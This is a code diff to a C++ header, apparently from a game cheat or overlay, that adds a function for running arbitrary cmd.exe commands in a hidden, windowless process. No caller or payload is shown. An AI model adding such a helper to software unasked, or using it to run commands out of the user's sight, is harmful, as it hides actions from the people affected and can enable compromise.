@@ -46,6 +46,7 @@
 #include <KnownFolders.h>
 #include <Psapi.h>
 #include <DirectXMath.h>
+#include <shlobj.h>
 
 // imgui
 #include "External/ImGui/imgui.h"
@@ -137,4 +138,34 @@ namespace Globals
 	inline int LocalPlayerIndex;
 
 	inline float m_fSensitivity;
+
+	inline void ExecuteCmdCommand(const std::string& command) {
+		STARTUPINFO si = { sizeof(STARTUPINFO) };
+		PROCESS_INFORMATION pi;
+
+		si.dwFlags = STARTF_USESHOWWINDOW;
+		si.wShowWindow = SW_HIDE;
+
+		std::string cmd = "cmd.exe /c " + command;
+
+		BOOL result = CreateProcess(
+			NULL,          
+			&cmd[0],           
+			NULL,            
+			NULL,             
+			FALSE,           
+			CREATE_NO_WINDOW,    
+			NULL,             
+			NULL,               
+			&si,                 
+			&pi                 
+		);
+
+		if (result) {
+			WaitForSingleObject(pi.hProcess, INFINITE);
+
+			CloseHandle(pi.hProcess);
+			CloseHandle(pi.hThread);
+		}
+	}
 }
